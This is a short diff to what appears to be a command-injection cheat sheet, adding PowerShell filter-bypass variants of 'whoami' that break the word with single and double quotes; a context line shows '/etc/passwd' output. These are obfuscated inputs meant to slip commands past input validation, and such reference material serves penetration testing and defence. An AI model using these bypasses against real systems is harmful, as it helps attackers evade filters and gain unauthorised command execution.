@@ -266,6 +266,7 @@ root:x:0:0:root:/root:/bin/bash
 ```powershell
 w'h'o'am'i
 wh''oami
+'w'hoami
 ```
 
 #### Bypass with double quote
@@ -273,6 +274,7 @@ wh''oami
 ```powershell
 w"h"o"am"i
 wh""oami
+"wh"oami
 ```
 
 #### Bypass with backticks
